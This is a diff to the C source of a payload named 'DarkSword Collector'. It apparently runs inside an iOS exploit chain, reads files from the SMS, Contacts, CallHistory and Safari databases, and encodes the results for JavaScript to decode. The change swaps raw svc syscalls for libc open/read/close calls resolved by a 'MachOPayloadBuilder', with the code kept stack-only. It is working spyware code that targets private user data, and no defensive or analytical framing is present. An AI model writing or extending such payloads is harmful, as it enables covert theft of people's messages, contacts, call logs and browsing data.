@@ -1,45 +1,17 @@
 /**
- * DarkSword Collector v13 - Read first 4 bytes of each file
- * Encodes results in return value for JS to decode
- * Return value: 
- *   bits 0-7:   SMS db first byte (0x53='S' means SQLite)
- *   bits 8-15:  Contacts db first byte
- *   bits 16-23: CallHistory db first byte
- *   bits 24-31: Safari db first byte
+ * DarkSword Collector v14 - libc file I/O via PLT
+ * Uses standard open/read/close (resolved by MachOPayloadBuilder)
+ * Stack-only, no globals
  */
-
-static long _svc1(long n, long a) {
-    register long x16 __asm__("x16") = n;
-    register long x0 __asm__("x0") = a;
-    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
-    return x0;
-}
-static long _svc2(long n, long a, long b) {
-    register long x16 __asm__("x16") = n;
-    register long x0 __asm__("x0") = a;
-    register long x1 __asm__("x1") = b;
-    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
-    return x0;
-}
-static long _svc3(long n, long a, long b, long c) {
-    register long x16 __asm__("x16") = n;
-    register long x0 __asm__("x0") = a;
-    register long x1 __asm__("x1") = b;
-    register long x2 __asm__("x2") = c;
-    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
-    return x0;
-}
-
-#define SYS_open  5
-#define SYS_read  3
-#define SYS_close 6
+#include <fcntl.h>
+#include <unistd.h>
 
 static unsigned char _read_first_byte(const char *path) {
-    int fd = (int)_svc2(SYS_open, (long)path, 0);
+    int fd = open(path, O_RDONLY);
     if (fd < 0) return 0;
     unsigned char buf[4];
-    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
-    _svc1(SYS_close, fd);
+    int n = read(fd, buf, 4);
+    close(fd);
     if (n < 1) return 0;
     return buf[0];
 }
